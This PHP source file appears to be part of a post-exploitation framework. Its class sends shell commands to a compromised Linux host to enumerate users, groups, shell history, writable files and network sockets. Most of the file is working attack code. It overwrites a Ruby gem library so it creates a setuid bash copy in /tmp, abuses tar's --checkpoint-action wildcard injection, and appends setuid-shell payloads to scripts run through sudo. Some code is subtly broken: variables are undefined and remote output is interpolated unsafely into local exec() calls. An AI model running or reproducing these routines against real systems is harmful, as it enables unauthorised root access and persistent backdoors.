<?php

class STREAM4COM extends SERVICE4COM {
    var $stream8service ;
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream) {
        parent::__construct($eth,$domain,$ip,$port,$protocol);
        $this->stream8service = $stream;
    }
    
  
    
    
    public function lan2env4path(){
        $data = "cat /etc/environment";
        $this->lan2stream4result($data,$this->stream_timeout);
        $data = "systemctl show-environment";
        $this->lan2stream4result($data,$this->stream_timeout);
        $data = "echo \$PATH ";
        return $this->lan2stream4result($data,$this->stream_timeout);
    }
    
    public function lan2start(){
        
        $this->titre(__FUNCTION__);
        
        $data = "id ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "/usr/bin/id ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "echo \$LOGNAME ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("logged on");
        $data = "who 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "w 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("Users that have previously logged onto the system");
        $data = "lastlog 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "last 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("What has the user being doing? Is there any password in plain text? What have they been edting?");
        $data = "history";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "date";
        $this->lan2stream4result($data, $this->stream_timeout);
        
        $data = "uname -a";
        $this->lan2stream4result($data, $this->stream_timeout);
        
        
        
        $data = "echo \$PWD ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$HOME ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "echo \$SESSION";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$TERM";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$SHELL ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo $0";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$BASH_VERSION";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "\$SHELL --version";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $data = "cat /etc/passwd ";
        $strings_etc_passwd = $this->lan2stream4result($data,$this->stream_timeout*2);
        
        $this->parse4etc_passwd($strings_etc_passwd);
        
        $this->users2gid_root();
        
        
        
        
        
        $data = "echo \$JOB ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "echo \$DISPLAY ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        
        $this->note("checks to see if roots home directory is accessible");
        $data = "ls -ahl /root/ 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Accounts that have recently used sudo");
        $data = "find /home -name .sudo_as_admin_successful 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "groups";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -E '^UID_MIN|^UID_MAX' /etc/login.defs";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("World-readable files within /home");
        $data = "find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Noowner files");
        $data = "find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        $data = "find / -writable -type d 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        $data = "find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        
        $data = "grep -v -e '^$' /etc/hosts /etc/resolv.conf  | grep -v '^#' | sort -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "dnsdomainname";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $this->note("Provides a list of active connections.
Can be used to determine what ports are listening on the server");
        $data = "cat /proc/net/tcp";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /proc/net/udp";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("This is used for route caching.
This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure");
        $data = "cat /proc/net/fib_trie";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("listening TCP");
        $data = "netstat -antp 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ss -t 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("listening UDP");
        $data = "netstat -anup 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ss -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "find / -executable -user $this->uid_name ! -group $this->uid_name -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
    }
    
    public function lan2whoami(){
        $username_found = "";
        $rst = $this->lan2id();
        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
        return $uid_name;
    }
    
    public function lan2id(){
        $data = "id";
        return $this->lan2stream4result($data,$this->stream_timeout);
        
    }
    
    public function lan2ip4wan(){
        $data = "wget http://ipecho.net/plain -O - -q ; echo";
        return trim($this->lan2stream4result($data,$this->stream_timeout));
    }
    
    
    
    public function lan2search4app4exist($app){
        $this->titre(__FUNCTION__);
        $app = trim($app);
        $data =  "which $app";
        $app_path = trim($this->lan2stream4result($data,$this->stream_timeout));
        if(stristr($app_path, "/$app")) return $app;
        else return FALSE;
    }
    
    
    public function users2gid_root(){
        
        
        $this->ssTitre("List of groups root ");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i | grep 'gid=0(root)' ;done 2>/dev/null";
        $users_all_rst = $this->lan2stream4result($data,$this->stream_timeout);
        $results = array();
        
        $users_tmp = explode("\n",$users_all_rst);
        foreach ($users_tmp as $line ){
            $this->article("line", $line);
            if (preg_match('/uid=(?<uid>[0-9]{1,5})\((?<username>[0-9a-zA-Z_\-]{1,})\) gid=0\(root\)/',$line,$results))  {
                if(!empty($results)){
                    $this->tab_users_gid_root[] = $results['username'] ;
                }
                
            }
            unset($results);
        }
        
        
        echo $this->tab($this->tab_users_gid_root);
        
        $this->ssTitre("Group memberships");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("look for adm group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(adm)\" 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("look for lxd group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(lxd)\" 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("look for docker group");
        $data = "for i in $(cut -d':' -f1 /etc/passwd 2>/dev/null);do id \$i;done | grep \"(docker)\" 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->ssTitre("List of users with no password");
        $data = "cat /etc/passwd | awk -F: '($2 != \"x\") {print}' ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->ssTitre("all root accounts (uid 0)");
        $data = "grep -v -E \"^#\" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 { print $1}' 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
    }

    public function lan2file4exist8name($filename){
        $this->ssTitre(__FUNCTION__);
        $filepath = $this->lan2file4locate($filename);
        if (!empty($filepath)){
            return TRUE;
        }
        ELSE return FALSE;
    }
    
    public function lan2file4exist8path($filepath){
        $this->ssTitre(__FUNCTION__);
        $tmp2 = array();
        $filepath_found = "";
        $data = "ls -al $filepath";
        $tmp = $this->lan2stream4result($data, $this->stream_timeout);
        exec("echo '$tmp' | awk '{print $9}' $this->filter_file_path ",$tmp2);
        
        if (isset($tmp2[0])) $filepath_found = $tmp2[0];
        if (!empty($filepath_found)){
            $chaine = "file exist";
            $this->note($chaine);
            return TRUE;
        }
        else {
            $chaine = "file does not exist";
            $this->rouge($chaine);
            return FALSE;
        }
    }
    
    public function lan2file4locate($filename){
        $this->ssTitre(__FUNCTION__);
        $files_found = "";
        $tmp2 = array();
        $data = "which $filename ";
        $tmp = trim($this->lan2stream4result($data,$this->stream_timeout));
        exec("echo '$tmp' $this->filter_file_path ",$tmp2);
        if (!empty($tmp2)) if (isset($tmp2[0])) $files_found = trim($tmp2[0]);
        
        if( (!empty($files_found)) && (stristr($files_found, $filename)) ){
            return $files_found ;
        }
        $data = "locate $filename ";
        $tmp = trim($this->lan2stream4result($data,$this->stream_timeout));
        exec("echo '$tmp' $this->filter_file_path ",$tmp2);
        if (!empty($tmp2)) if (isset($tmp2[0])) $files_found = trim($tmp2[0]);
        
        if( (!empty($files_found)) && (stristr($files_found, $filename)) ){
            return $files_found ;
        }
        
        $data = "find / -iname $filename -type f -exec ls {} \;";
        $tmp = trim($this->lan2stream4result($data,$this->stream_timeout));
        exec("echo '$tmp' $this->filter_file_path ",$tmp2);
        if (!empty($tmp2)) if (isset($tmp2[0])) $files_found = trim($tmp2[0]);
        
        if( (!empty($files_found)) && (stristr($files_found, $filename)) ){
            return $files_found ;
        }
        return $files_found;
    }
    
    public function lan2file4search($filename,$search_data){
        $this->ssTitre(__FUNCTION__);
        $search_data = trim($search_data);
        $obj_filename = new FILE($filename);
        
        $data = "cat $obj_filename->file_path";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $lines_tab = explode("\n", $lines);
        $this->article("Searching", $search_data);
        foreach ($lines_tab as $line){
            if (strstr($line, $search_data)!==FALSE)
            {
                $this->article("Searching", "Found ");
                return TRUE ;
            }
            
        }
        
        $this->article("Searching", "Not Found");
        return FALSE;
    }
    
    public function lan2file2backdoor($lan_filepath){
        $obj_exec = new FILE($lan_filepath);
        
        $data = "file $obj_exec->file_path";
        $file_info = $this->lan2stream4result($data,$this->stream_timeout);
        // if ($this->lan2file4writable($obj_jobs->file_path)){
        
        if ( $this->lan2file4exist8path($lan_filepath) ){
            switch ($file_info) {
                // Bourne-Again shell script, ASCII text executable
                case (strstr($file_info,"Bourne-Again shell script, ASCII text executable")!==FALSE) :
                    $this->lan2file2backdoor4ascii4bash($lan_filepath);
                    
                    break;
                    
                    
                case (strstr($file_info,"Ruby script, ASCII text executable")!==FALSE) :
                    $this->lan2file2backdoor4ruby($lan_filepath);
                    break;
                    
                    
                case (strstr($file_info,"tar, ")!==FALSE) :
                    $this->lan2file2backdoor4ascii4tar($lan_filepath);
                    break;
                    
                case (strstr($file_info,"ASCII text")!==FALSE) :
                    $this->lan2file2backdoor4ascii4bash($lan_filepath);
                    break;
                    
                default:
                    break;
            }
        }
    }
    
    public function lan2file2backdoor4ruby($lan_filepath){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $obj_jobs = new FILE($lan_filepath);
        $data = "cat $obj_jobs->file_path | grep -i require ";
        $source_code = $this->lan2stream4result($data,$this->stream_timeout);
        $query = "echo \"$source_code\" | grep -i require | awk '{print $2}' | grep -Po \"[0-9a-z\_\-/]{1,}\" ";
        $libs = array();
        exec($query,$libs);
        
        //$libs = array("zip");
        
        foreach ($libs as $lib){
            $lib = trim($lib);
            if (!empty($lib)){
                $hashname = sha1($lib);
                
                $data = "gem which $lib  | grep '/'";
                $rst_tmp = $this->lan2stream4result($data,$this->stream_timeout);
                $query = "echo \"".addslashes($rst_tmp)."\" | grep '/' | grep -Po \"^/[[:print:]]{1,}\" ";
                $tmp = array();
                exec($query,$tmp);
                $lib_path = $tmp[0];
                
                $this->article("LIB", $lib);
                $this->article("LIB PATH", $lib_path);
                //var_dump($tmp);fgets(STDIN);
                $this->pause();
                
                $data = "ls -al $lib_path";
                $this->lan2stream4result($data,$this->stream_timeout);
                $data = "chmod 777 $lib_path";
                $this->lan2stream4result($data,$this->stream_timeout);
                $data = "ls -al $lib_path";
                $this->lan2stream4result($data,$this->stream_timeout);
                $data = "ls -al /tmp/";
                $this->lan2stream4result($data,$this->stream_timeout);
                $data = "echo '`cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname`' > $lib_path";
                //$data = "echo '$(cp /bin/bash /tmp/$hashname && chmod 6755 /tmp/$hashname)' > $lib_path";
                $this->lan2stream4result($data,$this->stream_timeout);
                if (strstr($minute, "*")) $seconds = "60";
                else $seconds = $minute;
                $this->article("Wait Seconds", $seconds);
                
                sleep($seconds);
                $this->pause();
                
                $data = "ls -al /tmp/";
                $this->lan2stream4result($data,$this->stream_timeout);
                $data = "ls -al /tmp/$hashname";
                $this->lan2stream4result($data,$this->stream_timeout);
                $data = "/tmp/$hashname -p -c id";
                $rst_id = $this->lan2stream4result($data,$this->stream_timeout);
                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
                
                $this->pause();
                if (strstr($rst_id, "euid=")) {
                    $template_id = "/tmp/$hashname -p -c %ID%";
                    $templateB64_id = base64_encode($template_id);
                    $template_id_new = $this->lan2spawn2shell8euid($template_id,$euid_name);
                    
                    
                    $this->lan2pentest8id($template_id_new);
                    
                }
                
                
                
            }
        }
    }
    
    public function lan2file2backdoor4ascii4tar($lan_filepath){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $lan_filepath = trim($lan_filepath);
        $obj_jobs = new FILE($lan_filepath);
        
        $data = "file $obj_jobs->file_path";
        $this->lan2stream4result($data,$this->stream_timeout);
        // if ($this->lan2file4writable($obj_jobs->file_path)){
        $query = " | strings | grep \"tar\" | grep -Po \"tar \"";
        $check = $this->lan2stream4result("cat $obj_jobs->file_path $query ",$this->stream_timeout);
        $check_tar = exec("echo '$check' $query ");
        
        if (!empty($check_tar)){
            $sha1_hash = sha1($obj_jobs->file_path);
            $template_id_test = "echo  \"%ID%\" > /tmp/$sha1_hash.sh && echo \"\" > \"--checkpoint-action=exec=sh /tmp/$sha1_hash.sh\" && echo \"\" > --checkpoint=1";
            
            $this->lan2pentest8id($template_id_test);
            $this->pause();
        }
    }
    
    public function lan2file2backdoor4ascii4bash($lan_filepath){
        $this->ssTitre(__FUNCTION__);
        $lan_filepath = trim($lan_filepath);
        $obj_jobs = new FILE($lan_filepath);
        
        $data = "file $obj_jobs->file_path";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->lan2stream4result("cat $obj_jobs->file_path",$this->stream_timeout);
        
        $tab_users_shell = $this->ip2users4shell();
        foreach ($tab_users_shell as $username){
            //sleep($minute*60);
            if (!$this->ip2root8db($this->ip2id)){
                $template_id_test = "echo '%ID%' > $obj_jobs->file_path && sudo -u $username $obj_jobs->file_path";
                
                $this->lan2pentest8id($template_id_test);
                $this->pause();
            }
        }
    }
    
    public function lan2file2backdoor4ascii4bash2rm($lan_filepath){
        $this->ssTitre(__FUNCTION__);
        $lan_filepath = trim($lan_filepath);
        $obj_jobs = new FILE($lan_filepath);
        
        $data = "file $obj_jobs->file_path";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->lan2stream4result("cat $obj_jobs->file_path",$this->stream_timeout);
        
        $tab_users_shell = $this->ip2users4shell();
        foreach ($tab_users_shell as $username){
            //sleep($minute*60);
            $sha1_hash = sha1($obj_jobs->file_path.$username);
            
            $data = "cp /bin/bash /tmp/$sha1_hash && chmod 6777 /tmp/$sha1_hash";
            $this->lan2file4add($obj_jobs->file_path, $data);
            $this->pause();
            
            $data = "sudo -u $username $obj_jobs->file_path";
            $this->lan2stream4result($data,$this->stream_timeout);
            
            if ($this->lan2file4exist8path("/tmp/$sha1_hash")){
                $data = "ls -al /tmp/$sha1_hash ";
                $this->lan2stream4result($data,$this->stream_timeout);
                $template_id_test = "/tmp/$sha1_hash -p -c '%ID%'";
                $attacker_ip = $this->ip4addr4target($this->ip);
                $attacker_port = rand(1024,65535);
                //$attacker_port = 7777;
                $shell = "/bin/bash";
                $this->lan2pentest8id($template_id_test);
                $this->pause();
                $data = "rm -v /tmp/$sha1_hash ";
                $this->lan2stream4result($data,$this->stream_timeout);
            }
            
        }
    }
    
    
    public function lan2file4add($filename,$add_data){
        $this->ssTitre(__FUNCTION__);
        $obj_filename = new FILE($filename);
        
        if ($this->lan2file4search($obj_filename->file_path, $add_data)){
            $this->note("Already Added: $add_data");
            return TRUE;
        }
        else {
            $this->note("ADD: $add_data");
            $this->lan2stream4result("echo '$add_data' >> $obj_filename->file_path",$this->stream_timeout);
            $data = "cat $obj_filename->file_path";
            $tmp = $this->lan2stream4result($data,$this->stream_timeout);
            exec("echo '$tmp' | grep -Po '$add_data'  ",$rst);
            if (strstr($rst[0], $add_data)) {$this->log2succes("SUCCES ADD: $add_data");return TRUE;}
            else {$this->log2error("Failed ADD");return FALSE;}
        }
        
    }
    
    
    public function lan2file4writable($filename){
        $this->ssTitre(__FUNCTION__);
        $writable_rst = array();
        if ($this->lan2file4exist8path($filename)){
            $data = "stat $filename";
            $writable_test = trim($this->lan2stream4result($data,$this->stream_timeout));
            if (preg_match('/[0-7]{3}(?<user2write>[0-7]{1})\/[rwx\-]{7}/',$writable_test,$writable_rst))
            {
                if (isset($writable_rst['user2write'])){
                    $this->article("User Permission",$writable_rst['user2write']);
                    if ($writable_rst['user2write']>6) {
                        $this->rouge("Writeable $filename");
                        return TRUE;}
                        else {$this->note("Not Writeable less 6 $filename");return FALSE;}
                }
            }
            else {$this->note("Not Writeable $filename");return FALSE;}
        }
    }
    
    public function lan2file4readable($filename){
        $this->ssTitre(__FUNCTION__);
        $readable_rst = array();
        $data = "stat $filename";
        $readable_test = trim($this->lan2stream4result($data,$this->stream_timeout));
        if (preg_match('/[0-7]{3}(?<user2read>[0-7]{1})\/[rwx\-]{7}/',$readable_test,$readable_rst))
        {
            if (isset($readable_rst['user2read'])){
                $this->article("readable",$readable_rst['user2read']);
                if ($readable_rst['user2read']>4) {
                    $this->note("readable $filename");
                    return TRUE;}
                    
            }
        }
        else {$this->note("Not readable $filename");return FALSE;}
    }
    
    
    
    public function lan2file4replace($filename,$search_data,$replace_data){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $obj_filename = new FILE($filename);
        
        if ($this->lan2file4search($obj_filename->file_path,$search_data)){
            $data = "cat $obj_filename->file_path";
            $lines = $this->lan2stream4result($data,$this->stream_timeout);
            $lines_tab = explode("\n", $lines);
            
            foreach ($lines_tab as $line){
                if (preg_match('#['.$search_data.']#',$line))
                {
                    $this->article("Searching", "Found ");
                    $result .= str_replace($search_data, $replace_data, $line);
                }
                else {
                    $result .= $line;
                }
            }
            
            $this->article("Replacing", "Data ");
            $data = "echo '$result' > $obj_filename->file_path";
            $this->lan2stream4result($data,$this->stream_timeout);
            
        }
        else {
            $this->note("Data Not found: $search_data");
        }
        
        return $result;
    }
    
    
    
    public function lan2check4id8db($id8port,$templateB64_id,$id8b64):bool{
        $sql_w = "SELECT templateB64_id FROM LAN WHERE id8port = $id8port AND templateB64_id = '$templateB64_id' AND id8b64 = '$id8b64' ";
        echo "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"SELECT EXISTS($sql_w);\"  2>/dev/null \n";
        return $this->checkBD($sql_w);
    }
    
 
    
}

?>